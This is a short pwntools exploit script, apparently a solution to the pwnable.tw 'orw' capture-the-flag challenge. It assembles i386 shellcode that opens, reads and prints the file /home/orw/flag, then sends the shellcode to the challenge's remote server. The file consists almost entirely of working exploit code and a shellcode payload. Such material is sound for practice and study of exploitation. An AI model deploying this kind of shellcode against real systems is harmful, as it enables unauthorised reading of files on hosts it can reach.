from pwn import *

sc='''
mov eax,5
push 0x6761
push 0x6c662f77
push 0x726f2f65
push 0x6d6f682f
mov ebx,esp
xor ecx,ecx
int 0x80

mov eax,3
mov ebx,3
mov ecx,esp
mov edx,100
int 0x80

mov eax,4
mov ebx,1
mov ecx,esp
mov edx,100
int 0x80
'''
e=ELF('orw')
#p=process('orw')
p=remote('chall.pwnable.tw',10001)

print(p.recv())

context(arch='i386',os='linux')
scbin=asm(sc)

print(len(scbin))

#gdb.attach(p)

#pause()

p.send(scbin)

print(p.recv())
